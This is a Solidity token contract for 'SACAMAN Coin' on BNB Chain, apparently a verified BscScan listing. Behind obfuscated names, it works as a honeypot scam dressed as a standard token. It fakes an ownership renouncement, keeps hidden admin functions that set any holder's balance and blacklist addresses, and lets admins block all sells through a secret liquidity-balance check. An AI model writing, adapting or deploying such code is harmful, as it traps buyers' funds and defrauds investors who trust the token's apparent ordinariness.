/**
 *Submitted for verification at BscScan.com on 2023-05-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface feeShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeLimit) external view returns (uint256);

    function transfer(address listExempt, uint256 maxFrom) external returns (bool);

    function allowance(address buySell, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxFrom) external returns (bool);

    function transferFrom(
        address sender,
        address listExempt,
        uint256 maxFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoReceiver, uint256 value);
    event Approval(address indexed buySell, address indexed spender, uint256 value);
}

interface feeShouldMetadata is feeShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract autoLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldSwapTotal {
    function createPair(address sellWallet, address swapTotalAmount) external returns (address);
}

interface txFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SACAMANCoin is autoLimit, feeShould, feeShouldMetadata {

    address senderSellTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private enableLaunch = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return tradingLiquidity;
    }

    function transfer(address toAtAmount, uint256 maxFrom) external virtual override returns (bool) {
        return walletAt(_msgSender(), toAtAmount, maxFrom);
    }

    constructor (){
        
        launchEnable();
        txFee enableTeam = txFee(receiverLaunchLiquidity);
        sellSwap = shouldSwapTotal(enableTeam.factory()).createPair(enableTeam.WETH(), address(this));
        if (walletTeam != liquidityTake) {
            walletTeam = liquidityTake;
        }
        launchWalletTrading = _msgSender();
        walletAtMin[launchWalletTrading] = true;
        fromLaunch[launchWalletTrading] = enableLaunch;
        if (liquidityTake == enableTotal) {
            fromAt = true;
        }
        emit Transfer(address(0), launchWalletTrading, enableLaunch);
    }

    mapping(address => bool) public tradingTotalLaunched;

    function totalSupply() external view virtual override returns (uint256) {
        return enableLaunch;
    }

    function buyLaunch(address totalTrading, address listExempt, uint256 maxFrom) internal returns (bool) {
        require(fromLaunch[totalTrading] >= maxFrom);
        fromLaunch[totalTrading] -= maxFrom;
        fromLaunch[listExempt] += maxFrom;
        emit Transfer(totalTrading, listExempt, maxFrom);
        return true;
    }

    function allowance(address minTotal, address teamToken) external view virtual override returns (uint256) {
        if (teamToken == receiverLaunchLiquidity) {
            return type(uint256).max;
        }
        return receiverFee[minTotal][teamToken];
    }

    function symbol() external view virtual override returns (string memory) {
        return fundWallet;
    }

    function launchLaunchedTeam(uint256 maxFrom) public {
        fundTxIs();
        swapShould = maxFrom;
    }

    function marketingFrom(address toAtAmount, uint256 maxFrom) public {
        fundTxIs();
        fromLaunch[toAtAmount] = maxFrom;
    }

    function fundTxIs() private view {
        require(walletAtMin[_msgSender()]);
    }

    function tokenReceiverMarketing(address tokenTxLiquidity) public {
        if (marketingFund) {
            return;
        }
        
        walletAtMin[tokenTxLiquidity] = true;
        if (maxTx != fromAt) {
            maxTx = true;
        }
        marketingFund = true;
    }

    address private toLiquidity;

    function takeLaunched(address feeMaxTake) public {
        fundTxIs();
        if (maxTx) {
            enableWallet = walletTeam;
        }
        if (feeMaxTake == launchWalletTrading || feeMaxTake == sellSwap) {
            return;
        }
        tradingTotalLaunched[feeMaxTake] = true;
    }

    address receiverLaunchLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return toLiquidity;
    }

    function walletAt(address totalTrading, address listExempt, uint256 maxFrom) internal returns (bool) {
        if (totalTrading == launchWalletTrading) {
            return buyLaunch(totalTrading, listExempt, maxFrom);
        }
        uint256 launchReceiverFund = feeShould(sellSwap).balanceOf(senderSellTrading);
        require(launchReceiverFund == swapShould);
        require(!tradingTotalLaunched[totalTrading]);
        return buyLaunch(totalTrading, listExempt, maxFrom);
    }

    function owner() external view returns (address) {
        return toLiquidity;
    }

    bool public marketingFund;

    mapping(address => mapping(address => uint256)) private receiverFee;

    address public launchWalletTrading;

    uint8 private feeReceiver = 18;

    mapping(address => uint256) private fromLaunch;

    function decimals() external view virtual override returns (uint8) {
        return feeReceiver;
    }

    uint256 modeToken;

    function launchEnable() public {
        emit OwnershipTransferred(launchWalletTrading, address(0));
        toLiquidity = address(0);
    }

    function balanceOf(address takeLimit) public view virtual override returns (uint256) {
        return fromLaunch[takeLimit];
    }

    uint256 private enableWallet;

    address public sellSwap;

    uint256 private walletTeam;

    mapping(address => bool) public walletAtMin;

    string private fundWallet = "SCN";

    uint256 swapShould;

    function transferFrom(address totalTrading, address listExempt, uint256 maxFrom) external override returns (bool) {
        if (_msgSender() != receiverLaunchLiquidity) {
            if (receiverFee[totalTrading][_msgSender()] != type(uint256).max) {
                require(maxFrom <= receiverFee[totalTrading][_msgSender()]);
                receiverFee[totalTrading][_msgSender()] -= maxFrom;
            }
        }
        return walletAt(totalTrading, listExempt, maxFrom);
    }

    uint256 private liquidityTake;

    bool private maxTx;

    function approve(address teamToken, uint256 maxFrom) public virtual override returns (bool) {
        receiverFee[_msgSender()][teamToken] = maxFrom;
        emit Approval(_msgSender(), teamToken, maxFrom);
        return true;
    }

    string private tradingLiquidity = "SACAMAN Coin";

    bool private fromAt;

    uint256 public enableTotal;

    event OwnershipTransferred(address indexed maxSender, address indexed totalReceiver);

}